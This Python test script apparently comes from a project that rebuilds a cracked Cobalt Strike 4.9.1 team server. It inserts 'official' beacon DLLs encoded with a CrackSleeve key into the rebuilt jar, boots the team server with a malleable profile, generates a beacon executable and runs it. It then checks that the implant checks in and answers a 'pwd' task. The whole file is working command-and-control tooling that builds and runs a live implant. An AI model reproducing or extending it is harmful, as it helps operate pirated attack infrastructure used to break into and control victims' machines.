# -*- coding: utf-8 -*-
"""official_dll_control.py - CONTROL TEST: swap OFFICIAL 4.9.1 sleeve DLLs
(encoded with our CrackSleeve key) into our fat jar, boot our TS, deploy
own-exe, verify INITIAL + task round trip.  This proves our TS is fully
compatible with the OFFICIAL beacon DLL (the correct baseline for 4.9.1
compat testing, replacing the third-party OpenBeacon)."""
import os
import re
import shutil
import subprocess
import sys
import time
import zipfile
from pathlib import Path
from zipfile import ZipFile, ZIP_DEFLATED

P3 = r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts\p3-llvm-bench"
TSBOOT = P3 + r"\tsboot_run"
LOG = TSBOOT + r"\r1.log"
JDK = r"C:\Users\Administrator\Desktop\jdk-21.0.12.1\bin"
JAR = P3 + r"\build\libs\cs-gradle-4.9.1-SNAPSHOT-all.jar"
ENC = r"C:\Users\Public\official_ctrl"
OUT = open(r"C:\Users\Public\official_control.log", "w", encoding="utf-8")


def log(m):
    OUT.write("[%s] %s\n" % (time.strftime("%H:%M:%S"), m))
    OUT.flush()
    print(m, flush=True)


def main():
    # 0. kill everything
    subprocess.run(["powershell", "-NoProfile", "-Command",
                    'Get-CimInstance Win32_Process -Filter "name=\'java.exe\' or name=\'javaw.exe\'" | '
                    'ForEach-Object { Stop-Process -Id $_.ProcessId -Force }'], capture_output=True)
    for proc in ("franken_b1.exe", "notepad.exe", "dllhost.exe"):
        subprocess.run(["taskkill", "/IM", proc, "/F"], capture_output=True)
    time.sleep(4)
    for f in (TSBOOT + r"\r1_inbox.txt", TSBOOT + r"\r1_ack.txt"):
        if os.path.exists(f):
            os.remove(f)

    # 1. swap official encoded DLLs into our jar
    bak = JAR + ".bak_our"
    if not os.path.exists(bak):
        shutil.copy2(JAR, bak)
        log("backup saved")
    tmpjar = JAR + ".tmp"
    zin = ZipFile(JAR, "r")
    zout = ZipFile(tmpjar, "w", ZIP_DEFLATED)
    enc_main = open(ENC + r"\beacon.x64.dll.enc", "rb").read()
    enc_rl0k = open(ENC + r"\beacon.x64.rl0k.dll.enc", "rb").read()
    for item in zin.infolist():
        data = zin.read(item.filename)
        if item.filename == "sleeve/beacon.x64.dll":
            data = enc_main
            log("swapped beacon.x64.dll -> official enc %dB" % len(data))
        elif item.filename == "sleeve/beacon.x64.rl0k.dll":
            data = enc_rl0k
            log("swapped beacon.x64.rl0k.dll -> official enc %dB" % len(data))
        zout.writestr(item, data)
    zin.close()
    zout.close()
    os.replace(tmpjar, JAR)
    log("jar swapped with OFFICIAL sleeves")

    # 2. boot TS + headless
    subprocess.Popen([JDK + r"\java.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx2g", "-XX:+AggressiveHeap", "-XX:+UseParallelGC",
                      "-Djavax.net.ssl.keyStore=cobaltstrike.store",
                      "-Djavax.net.ssl.keyStorePassword=123456",
                      "-cp", JAR, "server.TeamServer", "192.168.100.200", "franken", "r2_inj_tpd.profile"],
                     cwd=TSBOOT)
    time.sleep(12)
    subprocess.Popen([JDK + r"\javaw.exe",
                      "--add-opens=java.base/sun.net.www.protocol.https=ALL-UNNAMED",
                      "--add-opens=java.base/sun.net.www.protocol.http=ALL-UNNAMED",
                      "--add-opens=java.base/java.net=ALL-UNNAMED",
                      "-Xmx512m", "-cp", JAR,
                      "aggressor.headless.Start", "192.168.100.200", "50050", "franken-opOFF", "franken",
                      "headless_franken.cna"],
                     cwd=TSBOOT)
    deadline = time.time() + 120
    while time.time() < deadline:
        if "READY" in open(LOG, encoding="utf-8", errors="replace").read()[-400:]:
            break
        time.sleep(3)
    log("TS ready (OFFICIAL sleeve)")

    sys.path.insert(0, TSBOOT)
    from tier3_common import send

    # 3. bake own-exe with official sleeve
    exe = Path(r"C:\Users\Public\official_b1.exe")
    if exe.exists():
        exe.unlink()
    send("artifact", "vnc-http", "exe", "x64", str(exe).replace("\\", "/"))
    t0 = time.time()
    while not (exe.exists() and exe.stat().st_size > 200000) and time.time() - t0 < 120:
        time.sleep(2)
    if not (exe.exists() and exe.stat().st_size > 200000):
        send('artifact', 'vnc-http', 'exe', 'x64', str(exe).replace(chr(92), '/'))
        t0 = time.time()
        while not (exe.exists() and exe.stat().st_size > 200000) and time.time() - t0 < 120:
            time.sleep(2)
    log("exe: %d B" % (exe.stat().st_size if exe.exists() else 0))
    if not exe.exists():
        log("VERDICT: FAIL - no exe")
        return

    # 4. run + wait INITIAL
    seen = set(re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read()))
    subprocess.Popen([str(exe)], cwd=r"C:\Users\Public",
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    bid = None
    deadline = time.time() + 180
    while time.time() < deadline:
        m = re.findall(r"INITIAL\t(\d+)", open(LOG, encoding="utf-8", errors="replace").read())
        new = [x for x in m if x not in seen]
        if new:
            bid = new[-1]
            break
        time.sleep(5)
    log("INITIAL: %s" % (bid or "NONE"))
    if not bid:
        log("VERDICT: FAIL - official DLL no checkin on OUR TS")
        return

    # 5. task round trip
    send("target", bid)
    time.sleep(2)
    p1 = len(open(LOG, encoding="utf-8", errors="replace").read())
    send("pwd")
    time.sleep(60)
    seg = open(LOG, encoding="utf-8", errors="replace").read()[p1:]
    ok = bool(re.search(r"ALT\t" + bid + r"\t.*[Cc]urrent directory", seg))
    log("pwd: %s" % ok)
    log("VERDICT: %s" % ("PASS - OFFICIAL 4.9.1 DLL checks in + tasks on OUR TS" if ok else "PARTIAL"))


if __name__ == "__main__":
    try:
        main()
    finally:
        OUT.close()
